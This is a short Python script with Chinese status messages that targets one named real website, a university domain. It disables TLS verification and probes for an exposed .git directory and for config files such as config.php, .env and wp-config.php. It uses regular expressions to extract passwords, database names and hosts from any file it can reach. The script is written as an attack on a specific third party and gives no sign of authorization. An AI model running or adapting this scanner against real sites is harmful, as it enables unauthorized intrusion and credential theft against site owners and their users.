#!/usr/bin/env python3
import requests
import re
urllib3 = __import__('urllib3')
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://olympic.su.ac.th"
session = requests.Session()
session.verify = False

print("[*] 检查.git目录...")

# 检查.git/config
git_paths = [
    "/.git/config",
    "/.git/HEAD",
    "/.git/index",
    "/.git/logs/HEAD",
    "/.git/objects/",
]

for path in git_paths:
    resp = requests.get(url + path, verify=False, timeout=5)
    if resp.status_code == 200:
        print(f"[+] {path} 可访问")
        if path.endswith("config"):
            # 提取数据库配置
            if "database" in resp.text.lower() or "password" in resp.text.lower():
                print(resp.text[:500])
        elif path.endswith("HEAD"):
            print(f"    {resp.text[:100]}")
    elif resp.status_code == 403:
        print(f"[*] {path} 403禁止")

# 尝试下载.git目录
print("\n[*] 尝试下载.git目录...")
try:
    resp = requests.get(url + "/.git/", verify=False, timeout=5)
    if resp.status_code == 200:
        # 查找文件链接
        files = re.findall(r'href="([^"]+)"', resp.text)
        for f in files[:10]:
            if f not in ["../", "./"]:
                print(f"  文件: {f}")
except:
    pass

print("\n[*] 检查config.php...")
resp = requests.get(url + "/config.php", verify=False, timeout=5)
if resp.status_code == 200:
    print("[+] config.php可访问")
    content = resp.text
    # 提取敏感信息
    if "password" in content.lower() or "database" in content.lower():
        # 提取密码和数据库信息
        passwords = re.findall(r'password["\']?\s*[=:]\s*["\']([^"\']+)["\']', content, re.IGNORECASE)
        databases = re.findall(r'database["\']?\s*[=:]\s*["\']([^"\']+)["\']', content, re.IGNORECASE)
        hosts = re.findall(r'host["\']?\s*[=:]\s*["\']([^"\']+)["\']', content, re.IGNORECASE)
        
        if passwords:
            print(f"[+] 发现密码: {passwords[:3]}")
        if databases:
            print(f"[+] 发现数据库: {databases[:3]}")
        if hosts:
            print(f"[+] 发现主机: {hosts[:3]}")
        
        # 打印部分内容（隐藏敏感信息）
        print(content[:1000])

print("\n[*] 检查其他配置文件...")
config_files = [
    "/.env",
    "/.env.local",
    "/database.php",
    "/db.php",
    "/config.inc.php",
    "/wp-config.php",
    "/application/config/database.php",
]

for cfg in config_files:
    resp = requests.get(url + cfg, verify=False, timeout=3)
    if resp.status_code == 200:
        print(f"[+] {cfg} 可访问")
        if "password" in resp.text.lower():
            print(f"    [!] 包含密码信息")
